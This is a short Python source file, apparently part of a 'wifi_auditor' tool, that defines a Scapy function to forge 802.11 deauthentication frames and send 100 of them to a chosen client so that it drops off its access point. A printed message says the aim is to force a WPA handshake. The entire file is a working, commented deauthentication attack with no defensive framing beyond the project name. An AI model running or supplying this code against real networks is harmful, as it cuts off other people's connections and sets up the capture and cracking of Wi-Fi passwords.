# === wifi_auditor/deauth_attack.py ===

from scapy.all import *  # Import all functions and classes from Scapy, used for crafting and sending packets


def deauth_target(interface, target_bssid, client_mac):
    """
    Sends deauthentication packets to a specific client to force disconnection from a Wi-Fi network.

    Parameters:
        interface (str): The wireless interface in monitor mode (e.g., wlan0mon).
        target_bssid (str): The MAC address of the target access point (BSSID).
        client_mac (str): The MAC address of the client device to disconnect.
    """

    # Create the 802.11 frame header for the deauth packet
    # addr1 = destination (client), addr2 = source (AP), addr3 = BSSID (AP)
    dot11 = Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid)

    # Build the full deauthentication frame: RadioTap header + Dot11 + Deauth reason code (7 = class 3 frame received from nonassociated station)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

    # Send the packet 100 times with 0.1 second intervals
    # This increases the chance of disconnection
    sendp(packet, iface=interface, count=100, inter=0.1, verbose=0)

    print("[*] Deauthentication packets sent to force handshake.")
